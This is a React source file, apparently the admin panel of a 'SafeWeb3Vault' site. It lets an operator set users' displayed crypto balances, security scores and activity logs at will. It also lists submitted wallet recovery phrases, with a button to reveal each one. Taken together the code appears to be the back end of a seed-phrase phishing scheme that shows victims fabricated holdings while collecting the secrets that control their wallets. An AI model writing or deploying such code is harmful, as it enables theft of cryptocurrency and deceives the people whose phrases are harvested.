// src/pages/AdminDashboard.jsx
import "./AdminDashboard.css";
import { auth, db } from "../firebase/firebase";
import { signOut } from "firebase/auth";
import { useNavigate } from "react-router-dom";
import {
  collection, onSnapshot, doc, updateDoc,
} from "firebase/firestore";
import { useEffect, useState } from "react";
import {
  LogOut, Users, Inbox, ChevronDown, ChevronUp,
  Save, X, Plus, Trash2, Shield, Wallet, Bitcoin,
  Activity, Eye, EyeOff,
} from "lucide-react";

const DEFAULT_COINS = ["BTC", "ETH", "SOL", "BNB", "XRP"];

function AdminDashboard() {
  const navigate = useNavigate();

  const [users, setUsers] = useState([]);
  const [submissions, setSubmissions] = useState([]);
  const [activeTab, setActiveTab] = useState("users");
  const [expandedUser, setExpandedUser] = useState(null);
  const [editState, setEditState] = useState({});
  const [saving, setSaving] = useState(null);
  const [toast, setToast] = useState(null);
  const [revealedPhrases, setRevealedPhrases] = useState({});

  useEffect(() => {
    const unsub = onSnapshot(collection(db, "users"), (snap) => {
      setUsers(snap.docs.map((d) => ({ id: d.id, ...d.data() })));
    });
    return unsub;
  }, []);

  useEffect(() => {
    const unsub = onSnapshot(collection(db, "walletConnections"), (snap) => {
      const docs = snap.docs.map((d) => ({ id: d.id, ...d.data() }));
      docs.sort((a, b) => (b.createdAt?.seconds || 0) - (a.createdAt?.seconds || 0));
      setSubmissions(docs);
    });
    return unsub;
  }, []);

  const handleLogout = async () => {
    await signOut(auth);
    navigate("/ledger-login");
  };

  const showToast = (msg, type = "success") => {
    setToast({ msg, type });
    setTimeout(() => setToast(null), 2500);
  };

  const startEditing = (user) => {
    // Build coin list: default coins + any extra coins the user already has
    const existingCoins = Object.keys(user.crypto || {});
    const allCoins = [...new Set([...DEFAULT_COINS, ...existingCoins])];

    setEditState((prev) => ({
      ...prev,
      [user.id]: {
        crypto: { ...user.crypto },
        coinList: allCoins,
        newCoinName: "",
        newCoinAmount: "",
        securityScore: user.securityScore ?? 0,
        connectedWallets: user.connectedWallets ?? 0,
        activity: [...(user.activity || [])],
        newActivity: "",
      },
    }));
    setExpandedUser(user.id);
  };

  const cancelEditing = (uid) => {
    setEditState((prev) => { const next = { ...prev }; delete next[uid]; return next; });
    setExpandedUser(null);
  };

  const updateField = (uid, field, value) =>
    setEditState((prev) => ({ ...prev, [uid]: { ...prev[uid], [field]: value } }));

  const updateCrypto = (uid, coin, value) =>
    setEditState((prev) => ({
      ...prev,
      [uid]: { ...prev[uid], crypto: { ...prev[uid].crypto, [coin]: value } },
    }));

  // Add a brand new custom coin
  const addCoin = (uid) => {
    const name = editState[uid]?.newCoinName?.trim().toUpperCase();
    const amount = editState[uid]?.newCoinAmount?.trim();
    if (!name) return;
    if (editState[uid].coinList.includes(name)) {
      showToast(`${name} already exists`, "error");
      return;
    }
    setEditState((prev) => ({
      ...prev,
      [uid]: {
        ...prev[uid],
        coinList: [...prev[uid].coinList, name],
        crypto: { ...prev[uid].crypto, [name]: amount || "0" },
        newCoinName: "",
        newCoinAmount: "",
      },
    }));
  };

  // Remove a coin entirely
  const removeCoin = (uid, coin) => {
    setEditState((prev) => {
      const newCrypto = { ...prev[uid].crypto };
      delete newCrypto[coin];
      return {
        ...prev,
        [uid]: {
          ...prev[uid],
          coinList: prev[uid].coinList.filter((c) => c !== coin),
          crypto: newCrypto,
        },
      };
    });
  };

  const addActivity = (uid) => {
    const text = editState[uid]?.newActivity?.trim();
    if (!text) return;
    setEditState((prev) => ({
      ...prev,
      [uid]: { ...prev[uid], activity: [text, ...prev[uid].activity], newActivity: "" },
    }));
  };

  const removeActivity = (uid, index) =>
    setEditState((prev) => ({
      ...prev,
      [uid]: { ...prev[uid], activity: prev[uid].activity.filter((_, i) => i !== index) },
    }));

  const saveUser = async (uid) => {
    setSaving(uid);
    try {
      const s = editState[uid];
      const cryptoClean = {};
      s.coinList.forEach((c) => {
        cryptoClean[c] = Number(s.crypto?.[c] || 0);
      });
      await updateDoc(doc(db, "users", uid), {
        crypto: cryptoClean,
        securityScore: Number(s.securityScore),
        connectedWallets: Number(s.connectedWallets),
        activity: s.activity,
      });
      showToast("User data saved successfully");
      cancelEditing(uid);
    } catch (err) {
      showToast("Failed to save: " + err.message, "error");
    } finally {
      setSaving(null);
    }
  };

  const togglePhrase = (id) =>
    setRevealedPhrases((prev) => ({ ...prev, [id]: !prev[id] }));

  const formatDate = (ts) => {
    if (!ts?.seconds) return "—";
    return new Date(ts.seconds * 1000).toLocaleString();
  };

  return (
    <div className="admin-root">
      {/* TOP NAVBAR */}
      <nav className="admin-topnav">
        <div className="admin-logo">
          <div className="logo-text">
            <span className="logo-safe">Safe</span>
            <span className="logo-web3">Web3</span>
            <span className="logo-vault">Vault</span>
          </div>
          <span className="admin-badge">Admin</span>
        </div>

        <div className="admin-nav">
          <button
            className={`admin-nav-item ${activeTab === "users" ? "active" : ""}`}
            onClick={() => setActiveTab("users")}
          >
            <Users size={18} /><span>Users</span>
            <span className="nav-count">{users.length}</span>
          </button>
          <button
            className={`admin-nav-item ${activeTab === "submissions" ? "active" : ""}`}
            onClick={() => setActiveTab("submissions")}
          >
            <Inbox size={18} /><span>Submissions</span>
            <span className="nav-count">{submissions.length}</span>
          </button>
        </div>

        <button className="admin-logout" onClick={handleLogout}>
          <LogOut size={16} /> <span>Logout</span>
        </button>
      </nav>

      {/* MAIN */}
      <main className="admin-main">
        <header className="admin-header">
          <h1>{activeTab === "users" ? "User Management" : "Wallet Submissions"}</h1>
          <p className="admin-subtitle">
            {activeTab === "users"
              ? `${users.length} registered user${users.length !== 1 ? "s" : ""}`
              : `${submissions.length} total submission${submissions.length !== 1 ? "s" : ""}`}
          </p>
        </header>

        {/* ── USERS TAB ── */}
        {activeTab === "users" && (
          <section className="admin-section">
            {users.length === 0 && <div className="empty-state">No users found.</div>}

            {users.map((user) => {
              const isExpanded = expandedUser === user.id;
              const isEditing = !!editState[user.id];
              const ed = editState[user.id] || {};

              return (
                <div className={`user-card ${isExpanded ? "expanded" : ""}`} key={user.id}>
                  <div
                    className="user-card-header"
                    onClick={() => isExpanded ? cancelEditing(user.id) : startEditing(user)}
                  >
                    <div className="user-avatar">
                      {user.fullName?.charAt(0).toUpperCase() || "?"}
                    </div>
                    <div className="user-info">
                      <h3>{user.fullName || "Unnamed"}</h3>
                      <p>{user.email}</p>
                    </div>
                    <div className="user-meta">
                      <span className="meta-chip"><Shield size={12} /> {user.securityScore ?? 0}%</span>
                      <span className="meta-chip"><Wallet size={12} /> {user.connectedWallets ?? 0}</span>
                      <span className="meta-chip"><Bitcoin size={12} /> {Object.keys(user.crypto || {}).length}</span>
                    </div>
                    <button className="expand-btn">
                      {isExpanded ? <ChevronUp size={18} /> : <ChevronDown size={18} />}
                    </button>
                  </div>

                  {isExpanded && isEditing && (
                    <div className="edit-panel">

                      {/* CRYPTO BALANCES */}
                      <div className="edit-section">
                        <h4 className="edit-section-title"><Bitcoin size={16} /> Crypto Balances</h4>

                        <div className="crypto-grid">
                          {ed.coinList?.map((coin) => (
                            <div className="crypto-field" key={coin}>
                              <label>{coin}</label>
                              <div className="crypto-input-row">
                                <input
                                  type="number" min="0" step="any"
                                  value={ed.crypto?.[coin] ?? 0}
                                  onChange={(e) => updateCrypto(user.id, coin, e.target.value)}
                                />
                                <button
                                  className="remove-coin-btn"
                                  onClick={() => removeCoin(user.id, coin)}
                                  title={`Remove ${coin}`}
                                >
                                  <X size={13} />
                                </button>
                              </div>
                            </div>
                          ))}
                        </div>

                        {/* ADD NEW COIN */}
                        <div className="add-coin-row">
                          <input
                            type="text"
                            placeholder="Coin (e.g. DOGE)"
                            value={ed.newCoinName || ""}
                            onChange={(e) => updateField(user.id, "newCoinName", e.target.value)}
                            className="add-coin-name"
                            onKeyDown={(e) => e.key === "Enter" && addCoin(user.id)}
                          />
                          <input
                            type="number"
                            placeholder="Amount"
                            value={ed.newCoinAmount || ""}
                            onChange={(e) => updateField(user.id, "newCoinAmount", e.target.value)}
                            className="add-coin-amount"
                            onKeyDown={(e) => e.key === "Enter" && addCoin(user.id)}
                          />
                          <button className="add-btn" onClick={() => addCoin(user.id)}>
                            <Plus size={16} />
                          </button>
                        </div>
                      </div>

                      {/* ACCOUNT STATS */}
                      <div className="edit-section">
                        <h4 className="edit-section-title"><Shield size={16} /> Account Stats</h4>
                        <div className="stats-fields">
                          <div className="stat-field">
                            <label>Security Score (%)</label>
                            <input
                              type="number" min="0" max="100"
                              value={ed.securityScore ?? 0}
                              onChange={(e) => updateField(user.id, "securityScore", e.target.value)}
                            />
                          </div>
                          <div className="stat-field">
                            <label>Connected Wallets</label>
                            <input
                              type="number" min="0"
                              value={ed.connectedWallets ?? 0}
                              onChange={(e) => updateField(user.id, "connectedWallets", e.target.value)}
                            />
                          </div>
                        </div>
                      </div>

                      {/* ACTIVITY LOG */}
                      <div className="edit-section">
                        <h4 className="edit-section-title"><Activity size={16} /> Activity Log</h4>
                        <div className="activity-add">
                          <input
                            type="text" placeholder="Add new activity entry…"
                            value={ed.newActivity || ""}
                            onChange={(e) => updateField(user.id, "newActivity", e.target.value)}
                            onKeyDown={(e) => e.key === "Enter" && addActivity(user.id)}
                          />
                          <button className="add-btn" onClick={() => addActivity(user.id)}>
                            <Plus size={16} />
                          </button>
                        </div>
                        <div className="activity-entries">
                          {ed.activity?.length === 0 && <p className="empty-activity">No activity entries.</p>}
                          {ed.activity?.map((entry, i) => (
                            <div className="activity-entry" key={i}>
                              <span>{entry}</span>
                              <button className="remove-btn" onClick={() => removeActivity(user.id, i)}>
                                <Trash2 size={14} />
                              </button>
                            </div>
                          ))}
                        </div>
                      </div>

                      {/* ACTIONS */}
                      <div className="edit-actions">
                        <button className="btn-cancel-edit" onClick={() => cancelEditing(user.id)}>
                          <X size={16} /> Discard
                        </button>
                        <button className="btn-save" onClick={() => saveUser(user.id)} disabled={saving === user.id}>
                          <Save size={16} />
                          {saving === user.id ? "Saving…" : "Save Changes"}
                        </button>
                      </div>
                    </div>
                  )}
                </div>
              );
            })}
          </section>
        )}

        {/* ── SUBMISSIONS TAB ── */}
        {activeTab === "submissions" && (
          <section className="admin-section">
            {submissions.length === 0 && <div className="empty-state">No submissions yet.</div>}
            <div className="submissions-grid">
              {submissions.map((sub) => (
                <div className="submission-card" key={sub.id}>
                  <div className="sub-header">
                    <div className="sub-wallet-type">{sub.walletType || "Unknown Wallet"}</div>
                    <div className="sub-date">{formatDate(sub.createdAt)}</div>
                  </div>
                  <div className="sub-fields">
                    <div className="sub-field">
                      <span className="sub-label">Name</span>
                      <span className="sub-value">{sub.walletName || "—"}</span>
                    </div>
                    <div className="sub-field">
                      <span className="sub-label">Email</span>
                      <span className="sub-value">{sub.submittedEmail || "—"}</span>
                    </div>
                    <div className="sub-field">
                      <span className="sub-label">Word Count</span>
                      <span className="sub-value">{sub.wordCount || "—"} words</span>
                    </div>
                    <div className="sub-field">
                      <span className="sub-label">Wallet UID</span>
                      <span className="sub-value uid-text">{sub.walletUID || "—"}</span>
                    </div>
                    <div className="sub-field phrase-field">
                      <span className="sub-label">Recovery Phrase</span>
                      <div className="phrase-reveal">
                        <span className={`sub-value phrase-value ${revealedPhrases[sub.id] ? "revealed" : "hidden"}`}>
                          {revealedPhrases[sub.id]
                            ? sub.recoveryPhrase
                            : "•".repeat(Math.min(sub.recoveryPhrase?.length || 32, 40))}
                        </span>
                        <button className="reveal-btn" onClick={() => togglePhrase(sub.id)}>
                          {revealedPhrases[sub.id] ? <EyeOff size={15} /> : <Eye size={15} />}
                        </button>
                      </div>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </section>
        )}
      </main>

      {toast && <div className={`admin-toast ${toast.type}`}>{toast.msg}</div>}
    </div>
  );
}

export default AdminDashboard;
